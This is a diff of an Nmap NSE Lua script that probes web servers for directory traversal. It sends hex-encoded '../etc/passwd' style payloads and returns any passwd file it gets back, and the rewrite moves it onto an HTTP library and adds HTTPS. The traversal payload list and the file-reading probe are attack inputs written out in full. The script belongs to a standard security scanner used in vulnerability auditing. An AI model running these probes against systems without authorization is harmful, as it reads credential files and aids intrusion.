@@ -1,8 +1,12 @@
 -- HTTP probe for /etc/passwd
--- 07/20/2007
 
--- Started with Thomas Buchanan's HTTPAuth.nse as a base
--- Applied some great suggestions from Brandon Enright, thanks a lot man!
+-- 07/20/2007:
+--   * Used Thomas Buchanan's HTTPAuth script as a starting point
+--   * Applied some great suggestions from Brandon Enright, thanks a lot man!
+--
+-- 01/31/2008:
+--   * Rewritten to use Sven Klemm's excellent HTTP library and to do some much
+--     needed cleaning up
 
 id = "HTTP directory traversal passwd probe"
 
@@ -15,63 +19,23 @@ license = "Look at Nmap's COPYING"
 categories = {"intrusive"}
 
 require "shortport"
+require "http"
 
--- Check for a valid HTTP return code, and check
--- the supposed passwd file for validity
+-- Check for valid return code and passwd format in body
 local validate = function(response)
-	local passwd
-	local line
-	local start, stop
-
-	-- Hopefully checking for only 200 won't bite me in the ass, but
-	-- it's the only one that makes sense and I haven't seen it fail
-	if response:match("HTTP/1.[01] 200") then
-		start, stop = response:find("\r\n\r\n")
-		passwd = response:sub(stop + 1)
-	else
-		return
+	if not response.status then
+		return nil
 	end
 
-	start, stop = passwd:find("[\r\n]")
-	line = passwd:sub(1, stop)
-
-	if line:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") then
-		return passwd
+	if response.status ~= 200 then
+		return nil
 	end
 
-	return
-end
-
--- Connects to host:port, send cmd, and returns the (hopefully valid) response
-local talk = function(host, port, cmd)
-	local socket
-	local response
-
-	socket = nmap.new_socket()
-
-	socket:connect(host.ip, port.number)
-
-	socket:send(cmd)
-
-	response = ""
-
-	while true do
-		local status, lines = socket:receive_lines(1)
-
-		if not status then
-			break
-		end
-
-		response = response .. lines
+	if not response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") then
+		return nil
 	end
 
-	socket:close()
-
-	return validate(response)
-end
-
-local httpget = function(str)
-	return "GET " .. str .. " HTTP/1.0\r\n\r\n"
+	return response.body
 end
 
 local hexify = function(str)
@@ -97,55 +61,23 @@ local output = function(passwd, dir)
 	return out
 end
 
-portrule = shortport.port_or_service({80, 8080}, "http")
+portrule = shortport.port_or_service({80, 443, 8080}, {"http", "https"})
 
 action = function(host, port)
-	local cmd, response
-	local dir
+	local dirs = {
+		"//etc/passwd",
+		string.rep("../", 10) .. "etc/passwd",
+		"." .. string.rep("../", 10) .. "etc/passwd",
+		string.rep("..\\/", 10) .. "etc\\/passwd",
+		string.rep("..\\", 10) .. "etc\\passwd"
+	}
 
-	dir = "//etc/passwd"
-	cmd = httpget(hexify(dir))
+	for _, dir in ipairs(dirs) do
+		local response = http.get(host, port, hexify(dir))
 
-	response = talk(host, port, cmd)
-
-	if response then
-		return output(response, dir)
-	end
-
-	dir = string.rep("../", 10) .. "etc/passwd"
-	cmd = httpget(hexify(dir))
-
-	response = talk(host, port, cmd)
-
-	if response then
-		return output(response, dir)
-	end
-
-	dir = "." .. string.rep("../", 10) .. "etc/passwd"
-	cmd = httpget(hexify(dir))
-
-	response = talk(host, port, cmd)
-
-	if response then
-		return output(response, dir)
-	end
-
-	dir = string.rep("..\\/", 10) .. "etc\\/passwd"
-	cmd = httpget(hexify(dir))
-
-	response = talk(host, port, cmd)
-
-	if response then
-		return output(response, dir)
-	end
-
-	dir = string.rep("..\\", 10) .. "etc\\passwd"
-	cmd = httpget(hexify(dir))
-
-	response = talk(host, port, cmd)
-
-	if response then
-		return output(response, dir)
+		if validate(response) then
+			return output(response.body, dir)
+		end
 	end
 
 	return
